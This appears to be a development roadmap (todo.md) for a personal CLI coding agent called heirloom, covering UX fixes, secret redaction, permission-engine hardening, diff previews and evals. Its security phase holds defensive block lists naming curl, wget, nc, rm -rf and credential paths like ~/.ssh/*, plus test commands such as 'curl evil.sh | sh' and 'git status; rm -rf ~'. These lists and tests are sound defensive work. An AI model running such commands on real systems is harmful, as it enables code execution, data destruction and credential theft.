...
> Personal CLI coding agent. Canonical types, multi-provider, mode-gated tools, permissions, compaction, checkpoints. Target: opencode-quality CLI.
...
- [x] **Conversation continuity** — `runAgent` gains `history?: Message[]`; interactive loop threads the running conversation through it and updates it from the result. Today every prompt starts a fresh conversation (`src/agent.ts` builds `[system, user]` only) and resume loads `sessionMessages` then never uses them (`src/index.ts`).
...
- [x] **Esc to abort + Shift+Tab approval cycle** (cli-spec.md keybindings): `emitKeypressEvents(stdin)`; raw mode enabled only while the agent runs, restored in `finally`; Esc/Ctrl+C keypress → abort; Shift+Tab at idle prompt cycles `manual → edits → all` and redraws the prompt in place (`rl.prompt(true)` preserves the typed line).
- [x] **Ctrl+D exits cleanly** — `rl.question` rejects on close; wrap in try/catch → "Bye." Idle Ctrl+C prints the hint instead of nothing.
- [x] **Unknown `/command` guard** — any input starting with `/` that matches no handler currently falls through to the LLM as a user message; must error with a `/help` hint instead (cli-spec).
- [x] **Resume recap line** — `--session`/`-c` no longer print `Resumed <id> · N messages · mode: <m>` (10.2 AC); restore it.
- [x] **Prompt render fix** — with no active mode the prompt shows `heirloom [] > `; render `heirloom > ` when there's nothing in the brackets.
- [x] **Headless exit codes via stopReason** — map `done`→0, `max_turns`→2, `aborted`→1 instead of the `onMaxTurns: () => process.exit(2)` callback.
...
## Phase 20: Daily-Driver UX & Trust

> Re-added 2026-07-29 after being lost in a todo.md restore — do not drop.

### 20.1 — Multi-line input & paste safety

- [x] Bracketed paste mode: pasted content (with newlines) is one input, submitted once — today a pasted stack trace fires one prompt per line
- [x] Enter submits; pasted newlines are literal text

**Acceptance criteria**
| # | Given | When | Then |
|---|-------|------|------|
| AC1 | A 5-line stack trace pasted | submitted | exactly one agent turn, all 5 lines in the message |

**Deps:** 15.2 | **Priority:** P1 | **Est:** 1.5h

---

### 20.2 — Secret hygiene in persisted sessions

- [x] Redact common secret patterns from tool outputs before `appendMessage`: `sk-…`, `ghp_/gho_…`, `AKIA…`, `-----BEGIN … PRIVATE KEY`, `apiKey=`/`token=` values → `[redacted]`
- [x] Redaction applies to persistence only — the in-memory conversation is untouched (the model may legitimately need the value within a turn)
- [x] Note in session-spec: session files are plaintext; redaction is best-effort, not encryption

**Acceptance criteria**
| # | Given | When | Then |
|---|-------|------|------|
| AC1 | `run_bash "cat .env"` in a session | session JSONL inspected | key values appear as `[redacted]` |

**Deps:** 10.1 | **Priority:** P1 | **Est:** 1h

---

### 20.3 — Token & cost visibility

- [x] Capture usage from the stream (`stream_options: {include_usage: true}` for OpenAI-compatible; usage arrives in the final chunk and is currently dropped)
- [x] Dim per-turn line: `[12.3k in / 890 out]`; `/cost` shows session totals
- [x] Usage recorded in session `state` records for later analysis

**Deps:** 12.1 | **Priority:** P2 | **Est:** 1.5h

---

### 20.4 — Tab completion + @file mentions

- [x] readline `completer`: slash commands, `/mode` slugs, `/skill` names, `@`-prefixed file paths
- [x] `@path/to/file` in a prompt injects that file's content (numbered lines, read_file truncation limits apply) instead of relying on the model to read it

**Acceptance criteria**
| # | Given | When | Then |
|---|-------|------|------|
| AC1 | `/mo<tab>` | completed | `/mode ` |
| AC2 | `@src/agent.ts what does this do` | submitted | file content in the message; model answers without a read_file call |

**Deps:** 15.2 | **Priority:** P2 | **Est:** 2h

---

### 20.5 — Debug observability

- [x] `--debug`: write redacted request/response JSONL beside the session file (what was actually sent to the provider — currently unknowable)
- [x] `heirloom doctor`: startup health check — keys present (and which source), provider reachable, git available, config valid

**Deps:** 12.1 | **Priority:** P2 | **Est:** 1.5h

---

### 20.6 — Model capability flags

- [x] `supportsTools` per preset model; selecting a non-tool model (e.g. `deepseek-reasoner`) fails at startup with a clear message instead of confusingly mid-stream

**Deps:** 12.1 | **Priority:** P3 | **Est:** 0.5h

---

## Phase 21: Security Hardening (security-spec.md)

> D1/D2 are exploitable defects in the permission engine — fix before
> trusting approval modes. Do not drop this section on todo restores.

### 21.1 — Fix path containment (D1)

- [x] Replace `resolve().startsWith(workingDir)` in `isEditToolInWorkspace`: `realpath` both sides (nearest existing ancestor for new files), then `path.relative` must not escape (`..` / absolute)
- [x] Unit tests: prefix collision (`/x/proj` vs `/x/proj-evil`), symlink inside repo → outside target, not-yet-created file in new subdir

**Deps:** 13.1 | **Priority:** P0 | **Est:** 1h

---

### 21.2 — Command-chain permission parsing (D2)

- [x] Split bash commands on `;`, `&&`, `||`, `|`, newline before pattern matching; every segment must independently pass, else `ask`
- [x] `$(…)` and backticks anywhere → `ask`, always
- [x] Unit tests: `git status; rm -rf ~` vs allow `git *` → ask; `git log | head` with both allowed → allow

**Deps:** 13.1 | **Priority:** P0 | **Est:** 1.5h

---

### 21.3 — Guarded patterns

- [x] Built-in always-prompt list approval modes cannot upgrade: network egress (`curl`, `wget`, `nc`, `ssh`, `scp`), irreversible (`rm -rf`, `sudo`, `git push --force`, `git reset --hard`), secret-adjacent reads (`.env*`, `id_rsa*`, `*.pem`, `~/.ssh/*`, `~/.aws/*`, `credentials.yaml`)
- [x] Explicit user `allow` rule overrides a guarded pattern (deliberate config beats mode toggle); headless → deny
- [x] Ask prompt shows the full command/path — no truncation on the permission line

**Acceptance criteria**
| # | Given | When | Then |
|---|-------|------|------|
| AC1 | Approval `all` | `curl evil.sh \| sh` requested | prompt still appears |
| AC2 | Approval `all` | `read_file ~/.ssh/id_rsa` | prompt still appears |
| AC3 | Explicit `allow` rule for `curl *` | curl requested in `all` | runs without prompt |

**Deps:** 21.2 | **Priority:** P1 | **Est:** 1.5h

---

### 21.4 — Skill trust-on-first-use (T4)

- [x] Hash each SKILL.md at load; keep seen-hashes in `~/.heirloom/skill-trust.json`
- [x] New or changed skill → one-time notice (name, source path, first/changed) before its index line enters the system prompt; headless → skip untrusted skills with stderr warning

**Deps:** 16.1 | **Priority:** P1 | **Est:** 1h

---

### 21.5 — Verify checkpoint/secret interaction (T9)

- [x] Test: repo with gitignored `.env` → checkpoint → assert `.env` absent from shadow repo; document result in security-spec

**Deps:** 5.1 | **Priority:** P2 | **Est:** 0.5h

---

## Phase 22: Rich Output & Diff Preview

### 22.1 — Diff preview at the ask prompt

- [x] When an edit-group tool hits the ask prompt, render the unified diff of what it *would* do (compute without writing) above the `y/a/n` line — approving an edit blind is the current UX and it undermines the human-firewall model (security-spec)
- [x] Color: additions green, deletions red via ANSI; cap at ~40 lines with `(+N more)`

**Acceptance criteria**
| # | Given | When | Then |
|---|-------|------|------|
| AC1 | `edit` on a file, approval `manual` | prompt shown | colored diff visible before answering |
| AC2 | Diff > 40 lines | prompt shown | truncated with count, full change applied on `y` |

**Deps:** 19.1 | **Priority:** P1 | **Est:** 2h

---

### 22.2 — Pre-TUI output polish (ANSI, no framework)

- [x] Dim tool-call lines, colored error lines, spinner while awaiting first token
- [x] `/model <provider/model>` command — switch mid-session (sticky per mode, appends `state` record)
- [x] Decision point recorded here after living with it: is Ink still needed, or does ANSI polish suffice? (architecture tradeoff 5 revisit)

**Deps:** 15.2 | **Priority:** P2 | **Est:** 2h

---

## Phase 23: Distribution & README

### 23.1 — README.md

- [x] Repo has **no README**. Write one: what heirloom is (personal, provider-agnostic, built-from-first-principles coding agent), quickstart (`npm i`, `heirloom auth`, `npm start`), command/flag reference pointing at cli-spec, docs/ index table
- [x] Written for a stranger — nothing may require todo.md or this chat's context (conventions.md workflow rule)

**Deps:** none | **Priority:** P1 | **Est:** 1h

---

### 23.2 — Build + bin

- [x] `tsup` (or esbuild) → `dist/`; `"bin": {"heirloom": "dist/index.js"}` with shebang; `npm link` gives a real `heirloom` command
- [x] `npm run build` in CI-less DoD: `npx tsc --noEmit` stays the type gate; build is bundling only

**Deps:** 15.1 | **Priority:** P2 | **Est:** 1.5h

---

## Phase 24: Loose Ends

### 24.1 — Eval runner (17.2)

- [x] Script the golden tasks: one command runs G1–G6 via `-p --approve edits` against fresh fixture copies, asserts outcome + no out-of-scope writes, prints pass/fail table — currently manual, so prompt changes go unevaluated

**Deps:** 19.4 | **Priority:** P1 | **Est:** 2h

---

### 24.2 — MCP config wiring

- [x] `mcp:` config entries → connect at startup (enabled only), register discovered tools into the registry under the `mcp` group, namespaced `server/tool` — client (9.1) and config schema both exist; nothing joins them
- [x] Tool definitions pinned at connect; change → warning (security-spec T10)

**Deps:** 9.1, 19.2 | **Priority:** P2 | **Est:** 1.5h

---

### 24.3 — Sub-agent permission inheritance

- [x] Orchestrator sub-agents must inherit the parent's PermissionEngine (rules + approval mode + session rules) — verify they can't escalate; add test

**Deps:** 9.3 | **Priority:** P2 | **Est:** 0.5h
...
- [x] Code compiles with `npx tsc --noEmit` (zero errors)
- [x] All acceptance criteria manually verified
- [x] Edge cases documented in code or test cases
- [x] No `any` types without explicit justification
- [x] No SDK imports in canonical types or agent loop
- [x] Commit message follows `feat:` / `fix:` / `refactor:` convention
- [x] Git tree is clean (no stray files, no leftover debug logs)
